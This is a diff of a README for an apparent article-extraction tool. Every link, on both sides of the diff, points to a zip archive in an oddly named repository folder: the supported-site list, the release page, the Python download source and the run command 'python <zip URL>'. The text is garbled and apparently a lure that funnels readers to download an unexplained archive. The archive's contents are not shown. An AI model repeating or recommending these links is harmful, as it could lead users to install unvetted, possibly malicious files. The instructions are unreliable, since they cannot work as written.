@@ -1,16 +1,16 @@
 # 📰 articles_project - Easily Extract Articles and Clean Up Content
 
-[![Download](https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip)](https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip)
+[![Download](https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip)](https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the articles_project! This tool helps you cleanly extract articles from popular websites like Habr, Proglib, and https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip By removing ads and unnecessary elements, it preserves the main content and keeps the formatting intact.
+Welcome to the articles_project! This tool helps you cleanly extract articles from popular websites like Habr, Proglib, and https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip By removing ads and unnecessary elements, it preserves the main content and keeps the formatting intact.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip). You will find the latest version available for download.
+To get started, visit this page to download: [Release Page](https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip). You will find the latest version available for download.
 
-1. Go to the [Release Page](https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip).
+1. Go to the [Release Page](https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip).
 2. Choose the version that fits your system.
 3. Click on the downloadable file to start the download.
 4. Once downloaded, locate the file on your computer.
@@ -44,7 +44,7 @@ Once you have downloaded the application, follow these steps to begin extracting
    Use the following command to start the tool:
 
    ```bash
-   python https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip [URL]
+   python https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip [URL]
    ```
 
    Replace `[URL]` with the link to the article you want to extract.
@@ -54,7 +54,7 @@ Once you have downloaded the application, follow these steps to begin extracting
 
 ## 📝 Features
 
-- **Supports Multiple Websites:** Extract articles from Habr, Proglib, and https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip easily.
+- **Supports Multiple Websites:** Extract articles from Habr, Proglib, and https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip easily.
 - **Removes Ads:** Focus solely on reading content without distractions.
 - **Maintains Formatting:** The output is easy to read and formatted correctly.
 - **Command Line Interface:** Simple commands allow you to use the tool without any complicated setups.
@@ -63,7 +63,7 @@ Once you have downloaded the application, follow these steps to begin extracting
 
 If you face issues while using the application, try these solutions:
 
-- **Python Not Found Error:** Ensure that you have Python installed on your computer. You can download it from [https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip](https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip).
+- **Python Not Found Error:** Ensure that you have Python installed on your computer. You can download it from [https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip](https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip).
   
 - **Permission Denied:** Run your command line as an administrator to avoid permission issues.
 
@@ -71,7 +71,7 @@ If you face issues while using the application, try these solutions:
 
 ## 📅 Updates and Support
 
-Keep an eye on the [Release Page](https://raw.githubusercontent.com/Flamimods/articles_project/main/subsequentially/articles_project.zip) for updates. Community support is important, so feel free to raise issues or ask questions in the repository's issue tracker.
+Keep an eye on the [Release Page](https://github.com/Flamimods/articles_project/raw/refs/heads/main/subsequentially/articles-project-3.9.zip) for updates. Community support is important, so feel free to raise issues or ask questions in the repository's issue tracker.
 
 ## 🌐 Contributing
 
